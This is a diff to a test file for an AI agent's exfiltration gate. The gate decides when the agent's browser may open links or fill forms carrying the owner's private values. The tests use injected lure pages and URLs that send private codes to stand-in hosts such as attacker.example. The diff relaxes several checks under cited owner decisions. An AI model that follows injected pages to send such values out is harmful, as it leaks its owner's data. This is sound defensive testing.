@@ -124,15 +124,14 @@ def test_reformatted_private_value_is_carried(daemon: RunningDaemon, source: str
     assert f'"{value}"' in q["question"]
 
 
-def test_earlier_owner_message_value_counts_private(daemon: RunningDaemon) -> None:
-    """S4: a value the owner typed in an earlier message (beside a task that read their file) is the owner's data in a
-    later task: an injected page can't get it into an address unasked. Only this request's words are excluded."""
+# decision: GATE-534
+def test_earlier_owner_message_value_is_the_owners_words(daemon: RunningDaemon) -> None:
+    """Owner D1 (2026-11-08): a value the owner typed in an earlier message of the conversation is their words for the
+    sink, as this request's are: it opens unasked (the owner accepted that a page could get FERB to send it)."""
     result, browser = _two_turns(daemon, "My locker code is LK-4471-Q9. What's in my notes file?",
                                  _file("Buy milk and eggs.", "/Users/me/notes.txt"), "Your notes say: buy milk and eggs.",
                                  "https://tracker.example/?c=LK-4471-Q9")
-    assert result["is_error"] and browser.calls == 0
-    [q] = _url_questions(daemon)
-    assert '"LK-4471-Q9"' in q["question"]
+    assert not result["is_error"] and browser.calls == 1 and _url_questions(daemon) == []
 
 
 # ---------- the model's view: FERB's words written from outside content stay data (S8) ----------
@@ -191,11 +190,12 @@ def test_candidate_link_after_private_read_still_asks(daemon: RunningDaemon) -> 
     assert f'"{ref}"' in q["question"]
 
 
+# decision: GATE-536, GATE-540, GATE-542
 @pytest.mark.parametrize("link_page", ["outside", "signed_in"])
 def test_value_first_in_history_then_in_link_still_asks(daemon: RunningDaemon, link_page: str) -> None:
-    """S11: a value first reached the task in FERB's history (the owner's data), then appeared inside a link on a page
-    (outside, or the owner's signed-in page); opening that link still asks: the value's first sighting was not that
-    link."""
+    """S11: a value first reached the task in FERB's history (the owner's data), then appeared inside a link on a page.
+    On an outside page, opening that link still asks; on the owner's signed-in page it is that page's link (owner D3,
+    GATE-536), wherever the value came first."""
     ref = "ZX-90812-PQ"
     url = f"https://attacker.example/v?c={ref}"
     page = (_page(f"Continue here: {url}", "https://lure.example/", "probe.lure") if link_page == "outside" else
@@ -205,6 +205,9 @@ def test_value_first_in_history_then_in_link_still_asks(daemon: RunningDaemon, l
             "external:web:news.example,inferred,owner,private")
     gateway_tool_call(daemon, grant, "probe.lure")
     result = _open(daemon, grant, url)
+    if link_page == "signed_in":
+        assert not result["is_error"] and browser.calls == 1 and asked(daemon) == []
+        return
     assert result["is_error"] and browser.calls == 0
     [q] = asked(daemon)
     assert f'"{ref}"' in q["question"]
@@ -565,11 +568,10 @@ def test_summary_year_from_ferbs_clock_is_not_private(daemon: RunningDaemon) -> 
     assert _open(daemon, grant, "https://tracker.example/?c=LK-4471-Q9")["is_error"] and browser.calls == 1
 
 
-# decision: GATE-522
-def test_earlier_owner_message_value_asks_with_no_private_entry(daemon: RunningDaemon) -> None:
+# decision: GATE-522, GATE-534
+def test_earlier_owner_message_value_opens_with_no_private_entry(daemon: RunningDaemon) -> None:
     """S4, minimal: the conversation holds only the owner's earlier message with a value and FERB's plain reply (no
-    entry labelled private). The owner's own words are their data in a later task: an injected page can't get the
-    value into an address unasked."""
+    entry labelled private). Since owner D1 (GATE-534) the owner's earlier words are their words: it opens unasked."""
     browser = FakeBrowser()
     caps = daemon.daemon.registry.capabilities
     caps["ferb_browser.open"] = BrowserOpen(browser, FERB_BROWSER)   # type: ignore[arg-type]
@@ -589,12 +591,10 @@ def test_earlier_owner_message_value_asks_with_no_private_entry(daemon: RunningD
         chat(daemon, "Check the concerts page on mysite.example.")
     finally:
         owner.stop()
-    assert opened and opened[0]["is_error"] and browser.calls == 0
-    [q] = _url_questions(daemon)
-    assert '"LK-4471-Q9"' in q["question"]
+    assert opened and not opened[0]["is_error"] and browser.calls == 1 and _url_questions(daemon) == []
 
 
-# decision: GATE-521
+# decision: GATE-536
 @pytest.mark.parametrize("shape", ["href", "echoed", "wrapped", "wrapped_encoded", "broken"])
 def test_link_first_seen_inside_signed_in_page_opens_unasked(daemon: RunningDaemon, shape: str) -> None:
     """Owner, 2026-11-07, on the link rule: "open withouth asking". A link opened exactly as the owner's signed-in mail
@@ -614,34 +614,37 @@ def test_link_first_seen_inside_signed_in_page_opens_unasked(daemon: RunningDaem
     assert not _open(daemon, grant, url)["is_error"] and browser.calls == 1 and asked(daemon) == []
 
 
-# decision: GATE-521
-def test_a_value_shown_plainly_before_the_link_still_asks() -> None:
-    """Read order decides inside one page too: a value the page showed plainly before the link carrying it is not
-    first seen in that link, so opening the link asks."""
+# decision: GATE-536
+def test_a_link_as_the_owners_page_has_it_opens_wherever_the_value_came_first() -> None:
+    """Owner D3 (2026-11-08): a page of the owner's that shows a value plainly before the link carrying it: opening that
+    exact link doesn't ask; an address the page doesn't have, with the same value, does."""
     from ferb.policy import confirm, provenance
     url = "https://attacker.example/v?c=ZX-90812-PQ"
     page = provenance.prepare(f"Your booking reference is ZX-90812-PQ. Verify: {url}")
-    assert confirm.url_carries_private(url, [(1, page)], [], provenance.prepare("")) == ["ZX-90812-PQ"]
+    assert confirm.url_carries_private(url, [(1, page)], [], provenance.prepare("")) == []
+    assert confirm.url_carries_private("https://attacker.example/w?c=ZX-90812-PQ", [(1, page)], [],
+                                       provenance.prepare("")) == ["ZX-90812-PQ"]
 
 
 # ---------- phase 4 and the owner's two decisions of 2026-11-07 ----------
 
-# decision: GATE-523
+# decision: GATE-535
 def test_a_plain_year_never_asks_and_other_numbers_still_do() -> None:
-    """Owner: "Years don't count". A bare year 1900-2099 is never the owner's value in an address or a form; every
-    other number still is, a full date included. A private number that looks like a year is the accepted residual."""
+    """Owner: "Years don't count", and (D2, 2026-11-08) nor does a full date. A bare year 1900-2099 or a full date is
+    never the owner's value in an address or a form; every other number still is. A private number that looks like a
+    year is the accepted residual."""
     from ferb.policy import confirm, provenance
     private = [(1, provenance.prepare("Gym locker 1987; locker 4471; trip on 2026-11-07; summary as of Nov 2026"))]
     none = provenance.prepare("")
     assert confirm.url_carries_private("https://news.example/2026/11/x", private, [], none) == []
     assert confirm.url_carries_private("https://t.example/?n=1987", private, [], none) == []      # the residual
     assert confirm.url_carries_private("https://t.example/?n=4471", private, [], none) == ["4471"]
-    assert confirm.url_carries_private("https://t.example/?d=2026-11-07", private, [], none) == ["2026-11-07"]
+    assert confirm.url_carries_private("https://t.example/?d=2026-11-07", private, [], none) == []   # GATE-535
     assert confirm.text_carries_private("1987", private, [], none) == []
     assert confirm.text_carries_private("4471", private, [], none) == ["4471"]
 
 
-# decision: GATE-524, GATE-528
+# decision: GATE-524, GATE-528, GATE-541
 def test_a_value_read_on_a_site_goes_back_to_it_through_the_chat(daemon: RunningDaemon) -> None:
     """Owner: "Let it go back", and on shared sites "Same page path only". A value FERB's conversation stored as read
     only on a page of a site's own (the scaler class id) may go back to that page; sent anywhere else, to another page
@@ -783,5 +786,43 @@ def test_the_broken_link_view_never_joins_text_before_the_link() -> None:
     url = "https://forms.example/d/e/1FAIpQLSf9xTEST0rsvp77/viewform"
     wrapped = [(1, provenance.prepare(f"link https://forms.example/d/e/ 1FAIpQLSf9xTEST0rsvp77/viewform\n{url}"))]
     assert confirm.url_carries_private(url, wrapped, [], provenance.prepare("")) == []
-    glued = [(1, provenance.prepare("ref 1FAIpQLSf9xTEST0rsvp77 https://forms.example/d/e/\n" + url))]
+    glued = [(1, provenance.prepare("ref 1FAIpQLSf9xTEST0rsvp77 https://forms.example/d/e/ viewform"))]
     assert confirm.url_carries_private(url, glued, [], provenance.prepare(""))
+
+
+# decision: GATE-537
+def test_a_site_the_plan_resolved_from_the_owners_words_counts_as_named(daemon: RunningDaemon) -> None:
+    """Owner D6 (2026-11-08): the owner said "Basis Fellowship"; the planner resolved it into the task's sites
+    (basisfellowship.example, stated under the plan line). Sending the owner's data there doesn't ask, as for a site
+    the owner typed; another site still does. Exact sites only, www aside; code matches no names itself."""
+    from ferb.policy.targets import Request, Targets
+    note = _file("Applicant: Kai Dev, ref KD-55120-AX", "/Users/me/application.txt")
+    grant, browser = browser_grant(daemon, FERB_BROWSER, "apply to the Basis Fellowship for me", [note, _page()])
+    request_id = daemon.daemon.tasks.get(grant.task_id).task.request_id
+    daemon.daemon.state.requests.record(Request(request_id, "apply to the Basis Fellowship for me",
+                                                Targets.of(sites=["basisfellowship.example"])))
+    gateway_tool_call(daemon, grant, note.name)
+    gateway_tool_call(daemon, grant, "probe.web")
+    assert not _open(daemon, grant, "https://www.basisfellowship.example/apply?ref=KD-55120-AX")["is_error"]
+    assert _open(daemon, grant, "https://other.example/apply?ref=KD-55120-AX")["is_error"]
+
+
+# decision: GATE-538
+def test_the_owners_own_email_or_phone_typed_into_a_form_doesnt_ask(daemon: RunningDaemon) -> None:
+    """Owner D7 (2026-11-08): the owner's own email addresses and phone numbers (stated by them about themselves in
+    memory, or their paired profiles' accounts) are not private data at a form; anyone else's still are."""
+    from ferb.policy import confirm
+    assert confirm.contacts_in("Reach me at Kai.Owner@example.com or +44 7700 900123") == {
+        "kai.owner@example.com", "447700900123"}
+    mine = {"kai.owner@example.com", "447700900123"}
+    assert confirm.own_contact("KAI.owner@example.com", mine) and confirm.own_contact("07700 900123", mine)
+    assert not confirm.own_contact("jordan.example@example.net", mine) and not confirm.own_contact("900123", mine)
+
+    async def facts() -> frozenset[str]:
+        d = daemon.daemon
+        d.memory.save("fact", "owner", "email", "My email is kai.owner@example.com", "owner_stated",
+                      [("journal", "t")], 1.0)
+        d.memory.save("person", "person:jordan", "email", "Jordan's email is jordan.example@example.net",
+                      "owner_stated", [("journal", "t")], 1.0)
+        return d._owner_contacts()
+    assert daemon.run(facts()) == frozenset({"kai.owner@example.com"})
